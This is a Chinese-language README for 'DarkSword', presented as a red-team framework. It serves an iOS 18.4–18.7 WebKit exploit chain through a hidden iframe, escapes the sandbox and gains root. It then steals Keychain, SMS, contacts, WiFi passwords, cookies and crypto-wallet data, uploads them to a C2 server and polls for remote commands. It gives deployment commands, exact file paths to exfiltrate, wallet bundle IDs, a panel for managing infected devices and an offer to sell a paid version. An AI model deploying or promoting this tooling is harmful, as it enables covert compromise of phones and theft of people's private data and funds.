# DarkSword Red Team Framework

DarkSword是一个基于iOS WebKit漏洞链的红队渗透测试框架，支持iOS 18.4 - 18.7版本的远程代码执行和权限提升。

> **⚠️ 免责声明**：本工具仅用于授权的安全测试和研究目的。使用前请确保您拥有目标系统的合法授权。未经授权的使用可能违反法律法规。

## 获取完整PRO项目

如需获取完整PRO版本及技术支持，请联系Telegram：[https://t.me/Jeequan](https://t.me/Jeequan)（技术支持费用：5000U）

## 功能特性

### 漏洞利用能力
| 能力 | 说明 |
|-----|------|
| **远程代码执行** | 通过WebKit漏洞在iOS设备上执行任意JavaScript代码 |
| **沙箱逃逸** | 突破iOS应用沙箱限制 |
| **权限提升** | 获取root级别系统权限 |
| **数据窃取** | 窃取iCloud数据、Keychain、照片、通讯录、短信等 |
| **文件操作** | 访问和操作设备文件系统 |

### 后台管理系统
基于FastAPI + Vue 3构建的完整管理后台，提供：

- **仪表盘**：实时统计和监控
- **设备管理**：管理受感染的iOS设备
- **访问日志**：记录设备访问记录
- **命令执行**：向设备发送执行命令
- **数据管理**：查看窃取的数据和文件
- **用户管理**：管理员权限管理

## 系统展示

### 首页仪表盘
![首页](展示/首页.png)

### 设备管理
![设备管理](展示/设备管理.png)

### 访问日志
![访问日志](展示/访问日志.png)

### 数据管理
![数据管理](展示/数据管理.png)

### 命令执行
![命令执行](展示/命令执行.png)

## 安装

```bash
git clone https://github.com/bhideki/darksword.git
cd darksword
pip install -e .
```

## 快速使用

### 启动漏洞服务器
```bash
darksword serve
```

在iOS设备上通过Safari访问：`http://<你的IP>:8080/`

### 启动管理后台
```bash
cd admin
python -m uvicorn main:app --host 0.0.0.0 --port 8000
```

访问后台：`http://localhost:8000`

默认管理员账号：`admin` / `admin123`

## CLI命令

| 命令 | 描述 |
|-----|------|
| `darksword serve` | 启动漏洞交付HTTP服务器 |
| `darksword sync` | 从GitHub同步payload文件 |
| `darksword list` | 列出本地可用的payload |
| `darksword info` | 显示漏洞链信息和CVE详情 |
| `darksword sync-kexploit` | 同步内核漏洞文件（Objective-C） |

### serve命令选项

```bash
darksword serve -H 0.0.0.0 -p 8080
darksword serve -p 8443 --c2-host https://your-c2.com/payload
```

- `-H, --host`: 监听地址（默认：0.0.0.0）
- `-p, --port`: 监听端口（默认：8080）
- `--c2-host`: 自定义C2服务器地址
- `--redirect`: 漏洞利用后的重定向URL

## 完整漏洞利用流程

### 阶段一：漏洞交付

```
iOS设备访问 http://<C2服务器IP>:8080/
        │
        ▼
┌───────────────────────────────┐
│  index.html (着陆页)          │
│  └─ 创建隐藏iframe            │
│      └─ 加载 frame.html       │
└───────────────────────────────┘
        │
        ▼
┌───────────────────────────────┐
│  frame.html                   │
│  └─ 动态注入 rce_loader.js    │
└───────────────────────────────┘
```

### 阶段二：远程代码执行（RCE）

```
┌───────────────────────────────┐
│  rce_loader.js               │
│  ├─ 检测iOS版本              │
│  │   ├─ iOS 18.6.x → 加载    │
│  │   │   rce_worker_18.6.js  │
│  │   │   rce_module_18.6.js  │
│  │   └─ 其他版本 → 加载      │
│  │       rce_worker_18.4.js  │
│  │       rce_module.js       │
│  ├─ 创建WebWorker            │
│  ├─ 触发dlopen漏洞           │
│  ├─ 执行RCE模块代码          │
│  └─ 注入shellcode            │
└───────────────────────────────┘
        │
        ▼
┌───────────────────────────────┐
│  rce_module.js /             │
│  rce_module_18.6.js          │
│  ├─ WebKit漏洞利用           │
│  ├─ JIT引擎漏洞              │
│  ├─ 获取代码执行权限          │
│  └─ 执行任意JavaScript代码    │
└───────────────────────────────┘
```

### 阶段三：沙箱逃逸

```
┌───────────────────────────────┐
│  sbx0_main_18.4.js /         │
│  sbx1_main.js                │
│  ├─ 利用沙箱漏洞             │
│  ├─ 突破应用沙箱限制         │
│  └─ 获取更高级别的文件访问   │
└───────────────────────────────┘
```

### 阶段四：权限提升（PE）

```
┌───────────────────────────────┐
│  pe_main.js                  │
│  ├─ 内核漏洞利用             │
│  ├─ 绕过ASLR保护             │
│  ├─ 利用KTRR漏洞             │
│  ├─ 获取内核读写权限         │
│  └─ 提升到root权限           │
└───────────────────────────────┘
```

### 阶段五：后漏洞利用（Post-Exploitation）

```
┌───────────────────────────────┐
│  post_exploit.js (新增)      │
│  ├─ 自动数据窃取             │
│  │   ├─ Keychain数据库       │
│  │   ├─ 通讯录              │
│  │   ├─ 短信                │
│  │   ├─ 通话记录            │
│  │   ├─ WiFi密码            │
│  │   └─ Cookies             │
│  ├─ 上传数据到C2服务器       │
│  ├─ 命令轮询 (每5秒)        │
│  │   └─ GET /cmd?device_uuid │
│  └─ 执行命令并返回结果       │
│      └─ POST /cmd_result     │
└───────────────────────────────┘
```

### 完整流程图

```
iOS Safari访问漏洞链接
        │
        ▼
┌───────────────────────────────┐     ┌───────────────────────┐
│  1. index.html               │     │                       │
│     └─ 加载 frame.html       │     │                       │
└───────────────────────────────┘     │                       │
        │                             │                       │
        ▼                             │                       │
┌───────────────────────────────┐     │                       │
│  2. rce_loader.js            │     │                       │
│     └─ 根据iOS版本加载       │     │                       │
│        RCE模块               │     │                       │
└───────────────────────────────┘     │                       │
        │                             │                       │
        ▼                             │                       │
┌───────────────────────────────┐     │                       │
│  3. rce_module.js            │     │                       │
│     └─ 获取远程代码执行权限   │     │                       │
└───────────────────────────────┘     │                       │
        │                             │                       │
        ▼                             │                       │
┌───────────────────────────────┐     │                       │
│  4. sbx_main.js              │     │                       │
│     └─ 沙箱逃逸              │     │                       │
└───────────────────────────────┘     │                       │
        │                             │                       │
        ▼                             │                       │
┌───────────────────────────────┐     │                       │
│  5. pe_main.js               │     │                       │
│     └─ 权限提升到root        │     │                       │
└───────────────────────────────┘     │                       │
        │                             │                       │
        ▼                             │                       │
┌───────────────────────────────┐     │   管理后台 (8000)     │
│  6. post_exploit.js          │────▶│   ┌───────────────┐   │
│     ├─ 自动窃取数据          │     │   │ 数据管理页面  │   │
│     ├─ 上传到C2服务器        │     │   └───────────────┘   │
│     └─ 命令轮询执行          │     │   ┌───────────────┐   │
└───────────────────────────────┘     │   │ 设备管理页面  │   │
        │                             │   └───────────────┘   │
        ▼                             │   ┌───────────────┐   │
┌───────────────────────────────┐     │   │ 命令执行页面  │   │
│  C2服务器 (8080)             │     │   └───────────────┘   │
│  ├─ /upload → 接收窃取数据   │     └───────────────────────┘
│  ├─ /cmd → 返回待执行命令    │
│  └─ /cmd_result → 接收结果   │
└───────────────────────────────┘
```

## 数据窃取流程详解

### 窃取的数据类型

| 数据类型 | 路径 | 说明 |
|---------|------|------|
| **Keychain数据库** | `/private/var/Keychains/keychain-2.db` | 系统密钥链，包含所有应用存储的密码、证书、密钥 |
| **通讯录** | `/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb` | 联系人信息 |
| **短信** | `/private/var/mobile/Library/SMS/sms.db` | 短信记录 |
| **通话记录** | `/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata` | 通话历史 |
| **WiFi密码** | `/private/var/preferences/com.apple.wifi.known-networks.plist` | 已连接WiFi密码 |
| **Cookies** | `/private/var/mobile/Library/Cookies/Cookies.binarycookies` | 浏览器Cookie |

### 数据上传流程

```
iOS设备本地文件
        │
        ▼
读取文件内容
        │
        ▼
Base64编码
        │
        ▼
POST /upload (JSON格式)
        │
        ▼
{
  "deviceUUID": "设备唯一标识",
  "category": "数据类型(keychain/contacts/sms等)",
  "path": "原始文件路径",
  "description": "描述信息",
  "data": "Base64编码的文件内容"
}
        │
        ▼
C2服务器存储到 exfil/ 目录
        │
        ▼
写入数据库 exfil_data 表
        │
        ▼
管理后台展示数据列表
```

## 命令执行流程详解

### 支持的命令类型

| 命令 | 说明 | 参数 |
|-----|------|------|
| `wallet.scan <类型> <bundle_id>` | 扫描指定钱包 | 钱包类型、应用Bundle ID |
| `file.read <路径>` | 读取文件内容 | 文件路径 |
| `file.list <路径>` | 列出目录内容 | 目录路径 |
| `system.info` | 获取系统信息 | 无 |
| `keychain.dump` | 导出Keychain | 无 |

### 命令执行流程

```
管理后台创建命令
        │
        ▼
写入 commands 表 (status=pending)
        │
        ▼
iOS设备轮询 GET /cmd?device_uuid=xxx
        │
        ▼
服务器返回待执行命令
        │
        ▼
iOS设备执行命令
        │
        ▼
POST /cmd_result
        │
        ▼
{
  "id": "命令ID",
  "output": "命令执行输出",
  "status": "completed/failed"
}
        │
        ▼
更新 commands 表状态
        │
        ▼
管理后台展示执行结果
```

## 支持的数字钱包

### Keychain存储（高可行性）

| 钱包 | Bundle ID | 区块链 |
|-----|-----------|-------|
| MetaMask | io.metamask | Ethereum/BSC/Polygon |
| Trust Wallet | com.trustwallet.app | Multi-chain |
| Coinbase Wallet | org.coinbase.wallet | Ethereum |
| imToken | org.consenlabs.tokens | Multi-chain |
| TokenPocket | com.tokenpocket.wallet | Multi-chain |
| AlphaWallet | io.stormbird.wallet | Ethereum |

### 沙箱存储（中等可行性）

| 钱包 | Bundle ID | 区块链 |
|-----|-----------|-------|
| MathWallet | com.mathwallet | Multi-chain |
| TronLink | org.tronlink.wallet | Tron |
| ONTO | com.onto.wallet | Multi-chain |
| Bitpie | com.bitpie.wallet | Multi-chain |
| Huobi Wallet | com.huobi.wallet | Multi-chain |
| Phantom | app.phantom | Solana |
| Keplr | com.keplr.wallet | Cosmos |
| Cosmostation | com.cosmostation.wallet | Cosmos |

## 项目结构

```
DarkSword/
├── admin/                    # 管理后台
│   ├── frontend/            # Vue 3前端
│   │   ├── src/
│   │   │   ├── views/       # 页面组件
│   │   │   │   ├── Dashboard.vue      # 仪表盘
│   │   │   │   ├── Devices.vue        # 设备管理
│   │   │   │   ├── DeviceDetail.vue   # 设备详情
│   │   │   │   ├── Logs.vue           # 访问日志
│   │   │   │   ├── Exfil.vue          # 数据管理
│   │   │   │   ├── Wallets.vue        # 数字钱包
│   │   │   │   ├── Keychain.vue       # Keychain查看器
│   │   │   │   ├── WiFi.vue           # WiFi密码
│   │   │   │   ├── Contacts.vue       # 通讯录
│   │   │   │   ├── SMS.vue            # 短信记录
│   │   │   │   ├── Calls.vue          # 通话记录
│   │   │   │   ├── Photos.vue         # 照片管理
│   │   │   │   ├── FileBrowser.vue    # 文件浏览器
│   │   │   │   ├── CommandHistory.vue # 命令历史
│   │   │   │   ├── CommandScripts.vue # 命令脚本
│   │   │   │   ├── Settings.vue       # 系统设置
│   │   │   │   ├── Audit.vue          # 审计日志
│   │   │   │   ├── Notifications.vue  # 通知中心
│   │   │   │   └── Users.vue          # 用户管理
│   │   │   ├── stores/      # Pinia状态管理
│   │   │   ├── utils/       # 工具函数
│   │   │   ├── router/      # 路由配置
│   │   │   └── App.vue      # 主应用组件
│   │   └── package.json
│   ├── routers/             # FastAPI路由
│   │   ├── auth.py          # 认证路由
│   │   ├── logs.py          # 日志路由
│   │   ├── devices.py       # 设备路由
│   │   ├── exfil.py         # 数据窃取路由
│   │   ├── wallets.py       # 钱包路由
│   │   ├── commands.py      # 命令路由
│   │   ├── settings.py      # 设置路由
│   │   ├── audit.py         # 审计路由
│   │   └── notifications.py # 通知路由
│   ├── main.py              # 后端入口
│   ├── auth.py              # 认证模块
│   ├── database.py          # 数据库模型
│   └── schemas.py           # Pydantic模型
├── darksword/               # Python核心模块
│   ├── cli.py               # CLI入口
│   ├── server.py            # HTTP服务器
│   ├── payloads.py          # Payload管理
│   └── config.py            # 配置管理
├── payloads/                # Web漏洞payload
│   ├── index.html           # 着陆页
│   ├── frame.html           # 隐藏iframe
│   ├── rce_loader.js        # RCE加载器
│   ├── rce_module.js        # RCE模块(iOS 18.4-18.5)
│   ├── rce_module_18.6.js   # RCE模块(iOS 18.6+)
│   ├── rce_worker_18.4.js   # WebWorker(iOS 18.4-18.5)
│   ├── rce_worker_18.6.js   # WebWorker(iOS 18.6+)
│   ├── sbx0_main_18.4.js    # 沙箱逃逸
│   ├── sbx1_main.js         # 沙箱逃逸
│   ├── pe_main.js           # 权限提升
│   └── post_exploit.js      # 后漏洞利用(新增)
├── kexploit/                # 内核漏洞文件
├── templates/               # 着陆页模板
├── exfil/                   # 窃取数据存储目录
├── 展示/                    # 系统截图
├── darksword.db             # SQLite数据库
├── pyproject.toml
└── README.md
```

## 数据库表结构

### devices（设备表）
| 字段 | 类型 | 说明 |
|-----|------|------|
| id | INTEGER | 主键 |
| device_uuid | VARCHAR(100) | 设备唯一标识 |
| first_seen | DATETIME | 首次出现时间 |
| last_seen | DATETIME | 最后出现时间 |
| ip | VARCHAR(50) | IP地址 |
| user_agent | VARCHAR(500) | 用户代理 |
| status | VARCHAR(20) | 状态(active/offline) |
| os_version | VARCHAR(50) | iOS版本 |
| device_model | VARCHAR(100) | 设备型号 |
| chipset | VARCHAR(100) | 芯片型号 |
| jailbroken | VARCHAR(10) | 越狱状态 |
| exploit_status | VARCHAR(20) | 漏洞利用状态 |
| last_command_time | DATETIME | 最后命令时间 |

### logs（日志表）
| 字段 | 类型 | 说明 |
|-----|------|------|
| id | INTEGER | 主键 |
| timestamp | DATETIME | 时间戳 |
| ip | VARCHAR(50) | IP地址 |
| method | VARCHAR(10) | 请求方法 |
| path | VARCHAR(500) | 请求路径 |
| status_code | INTEGER | 状态码 |
| content_length | INTEGER | 内容长度 |
| user_agent | VARCHAR(500) | 用户代理 |
| log_type | VARCHAR(20) | 日志类型(ios/request/exfil) |
| device_uuid | VARCHAR(100) | 设备UUID |

### exfil_data（窃取数据表）
| 字段 | 类型 | 说明 |
|-----|------|------|
| id | INTEGER | 主键 |
| device_uuid | VARCHAR(100) | 设备UUID |
| category | VARCHAR(50) | 数据类别(keychain/contacts/sms等) |
| path | VARCHAR(500) | 原始路径 |
| description | VARCHAR(200) | 描述 |
| file_path | VARCHAR(500) | 本地存储路径 |
| file_size | INTEGER | 文件大小 |
| uploaded_at | DATETIME | 上传时间 |

### commands（命令表）
| 字段 | 类型 | 说明 |
|-----|------|------|
| id | INTEGER | 主键 |
| device_uuid | VARCHAR(100) | 设备UUID |
| command | TEXT | 命令内容 |
| status | VARCHAR(20) | 状态(pending/executing/completed/failed) |
| output | TEXT | 执行输出 |
| created_at | DATETIME | 创建时间 |
| executed_at | DATETIME | 执行时间 |

## API接口列表

### 认证接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| POST | `/api/auth/login` | 用户登录 |

### 日志接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| GET | `/api/logs` | 获取日志列表 |
| GET | `/api/logs/stats` | 获取统计数据 |
| DELETE | `/api/logs/batch` | 批量删除 |
| DELETE | `/api/logs/clear` | 清空日志 |

### 设备接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| GET | `/api/devices` | 获取设备列表 |
| GET | `/api/devices/{uuid}` | 获取设备详情 |
| GET | `/api/devices/{uuid}/logs` | 获取设备日志 |
| GET | `/api/devices/{uuid}/exfil` | 获取设备窃取数据 |
| DELETE | `/api/devices/{uuid}` | 删除设备 |

### 数据窃取接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| GET | `/api/exfil` | 获取窃取数据列表 |
| GET | `/api/exfil/{id}` | 获取数据详情 |
| GET | `/api/exfil/{id}/download` | 下载文件 |
| DELETE | `/api/exfil/{id}` | 删除数据 |
| GET | `/api/exfil/keychain` | Keychain数据 |
| GET | `/api/exfil/wifi` | WiFi数据 |
| GET | `/api/exfil/contacts` | 通讯录 |
| GET | `/api/exfil/sms` | 短信 |
| GET | `/api/exfil/calls` | 通话记录 |
| GET | `/api/exfil/photos` | 照片 |
| GET | `/api/exfil/files` | 文件 |

### 钱包接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| GET | `/api/wallets/types` | 获取钱包类型 |
| GET | `/api/wallets` | 获取钱包数据 |
| GET | `/api/wallets/stats` | 统计信息 |
| GET | `/api/wallets/{id}` | 钱包详情 |
| GET | `/api/wallets/{id}/download` | 下载文件 |
| GET | `/api/wallets/mnemonic/{id}` | 解析助记词 |
| POST | `/api/wallets/scan` | 扫描钱包 |
| DELETE | `/api/wallets/{id}` | 删除数据 |

### 命令接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| POST | `/api/commands` | 创建命令 |
| GET | `/api/commands` | 获取命令列表 |
| POST | `/api/commands/{id}/retry` | 重试命令 |
| DELETE | `/api/commands/{id}` | 删除命令 |

### 设置接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| GET | `/api/settings` | 获取设置 |
| PUT | `/api/settings` | 更新设置 |

### 审计接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| GET | `/api/audit` | 获取审计日志 |

### 通知接口
| 方法 | 路径 | 说明 |
|-----|------|------|
| GET | `/api/notifications` | 获取通知列表 |
| PUT | `/api/notifications/{id}` | 标记已读 |

## 支持的iOS版本

- iOS 18.4
- iOS 18.5
- iOS 18.6
- iOS 18.6.1
- iOS 18.6.2
- iOS 18.7

## 参考资料

- [Google Threat Intelligence - DarkSword iOS Exploit Chain](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain)
- [DarkSword-RCE GitHub](https://github.com/htimesnine/DarkSword-RCE)
- [darksword-kexploit GitHub](https://github.com/opa334/darksword-kexploit)

## 许可证

MIT License - 仅用于教育和授权安全测试目的。